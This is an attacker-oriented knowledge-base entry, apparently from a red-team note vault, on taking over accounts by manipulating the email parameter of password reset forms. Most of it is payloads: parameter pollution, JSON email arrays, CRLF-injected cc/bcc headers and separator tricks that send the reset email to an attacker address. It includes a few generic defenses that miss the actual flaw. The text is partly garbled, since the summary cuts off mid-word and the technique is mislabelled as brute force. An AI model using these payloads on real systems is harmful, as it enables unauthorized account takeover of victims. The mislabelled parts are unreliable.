---
id: 571b3b9c-e285-4211-80a0-c5caec75893d
name: Password Reset via Email Parameter
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:53.820766+00:00'
updated_at: '2023-04-06T03:55:53.842671+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
tags:
- '[[Account Takeover]]'
- '[[Password Reset Feature]]'
- '[[Password Reset Via Email Parameter]]'
commands:
- '[[Array of emails]]'
- '[[Carbon copy]]'
- '[[Parameter pollution]]'
- '[[Separator]]'
---

# Password Reset via Email Parameter

## Summary

This procedure involves exploiting the password reset feature of a target system by manipulating the email parameter. By sending multiple email addresses or using other separators, an attacker can potentially bypass the system's security measures and gain access to the victim's account. This techni

## Description

# Description

This procedure involves exploiting the password reset feature of a target system by manipulating the email parameter. By sending multiple email addresses or using other separators, an attacker can potentially bypass the system's security measures and gain access to the victim's account. This technique is commonly used in credential stuffing attacks and can result in a full account takeover.

 

## Requirements

1. Access to the target system's password reset feature

1. Knowledge of the victim's email address

 

## Defense

1. Implement rate limiting and account lockout mechanisms to prevent brute force attacks

1. Use multi-factor authentication to add an extra layer of security

1. Monitor for suspicious login attempts and alert users of potential unauthorized access

 

## Objectives

1. Gain unauthorized access to a victim's account

 

# Instructions

1. Use the above commands to manipulate the email parameter and send multiple email addresses or use other separators to bypass the system's security measures and gain access to the victim's account.

 



**Code**: [[# parameter pollution
email=victim@mail.com&email=]]



> The 'email' parameter is commonly used in password reset features to identify the account that needs to be reset. By manipulating this parameter, an attacker can potentially bypass the system's security measures and gain access to the victim's account. The above commands demonstrate various methods of manipulating the email parameter, including sending multiple email addresses, using other separators, and using carbon copy to send the email to both the victim and the attacker.



**Command** ([[Parameter pollution]]):

```bash
email=victim@mail.com&email=hacker@mail.com
```





**Command** ([[Array of emails]]):

```bash
{"email":["victim@mail.com","hacker@mail.com"]}
```





**Command** ([[Carbon copy]]):

```bash
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com
```





**Command** ([[Separator]]):

```bash
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]

## Commands Used

- [[Array of emails]]
- [[Carbon copy]]
- [[Parameter pollution]]
- [[Separator]]

## Tags

- [[Account Takeover]]
- [[Password Reset Feature]]
- [[Password Reset Via Email Parameter]]


